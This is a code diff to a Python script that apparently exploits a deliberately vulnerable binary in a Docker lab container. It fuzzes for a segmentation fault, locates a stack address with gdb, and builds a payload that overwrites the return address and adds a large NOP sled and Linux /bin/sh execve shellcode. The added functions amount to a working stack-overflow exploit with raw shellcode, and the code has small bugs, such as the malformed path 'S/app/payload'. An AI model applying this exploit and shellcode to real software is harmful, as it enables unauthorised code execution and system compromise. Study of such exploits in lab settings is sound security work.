@@ -4,10 +4,17 @@ import os
 import re
 import sys
 import time
+import base64
 
 
 
 def stack_middle_address():
+
+    trash_command = [
+        'docker', 'exec', '-u', 'root', 'vuln_container', 'bash', '-c',
+        'python3 -c \'import sys; trash=b"\\x42"*131000; sys.stdout.buffer.write(trash)\' > /app/trash'
+    ]
+    subprocess.run(trash_command, check=True, text=True, capture_output=True)
 
     trash_args = "`cat trash` " * 15    
     docker_exec_command = f"docker exec -i vuln_container gdb vuln"
@@ -45,7 +52,7 @@ def stack_middle_address():
 
     return middle
 
-def test_crash(input):
+def test_crash(input: str):
         
         # vuln_command = f"docker exec -i vuln_container echo -n {overflow} | ./vuln"
         # vuln_command = (
@@ -62,7 +69,33 @@ def test_crash(input):
         output, _ = vuln_proc.communicate()
         parts = output.strip().split('\n')
         return int(parts[-1].strip())
-        
+
+def get_shellcode():
+    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+    return shellcode
+
+def construct_payload(test_case: str):
+
+    test_case += 'A'*4
+
+    jmp_addr = stack_middle_address()
+
+    payload = test_case.encode('utf-8')
+    payload += struct.pack("<I", jmp_addr)
+    payload += b'\x90' * 200000
+    payload += get_shellcode()
+
+
+    with subprocess.Popen(
+        ['docker', 'exec', '-i', 'vuln_container', 'bash', '-c', 'cat > S/app/payload'],
+        stdin=subprocess.PIPE,
+        text=False  #working with binary input not text
+    ) as proc:
+        # Write the payload to the container's stdin
+        proc.stdin.write(payload)
+        proc.stdin.close()
+        proc.wait()
+
 
 
 def main():
@@ -73,19 +106,17 @@ def main():
     subprocess.Popen(docker_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
 
-    trash_command = [
-        'docker', 'exec', '-u', 'root', 'vuln_container', 'bash', '-c',
-        'python3 -c \'import sys; trash=b"\\x42"*131000; sys.stdout.buffer.write(trash)\' > /app/trash'
-    ]
-    subprocess.run(trash_command, check=True, text=True, capture_output=True)
-
-    middle = stack_middle_address()
 
     test_case = "A"           #replace with a test generating method
     while True:
         exit_code = test_crash(test_case)
+
         if exit_code == 139:
             print("segmentation fault")
+            construct_payload(test_case)
+
+            while True:
+                break
             break
 
         else:
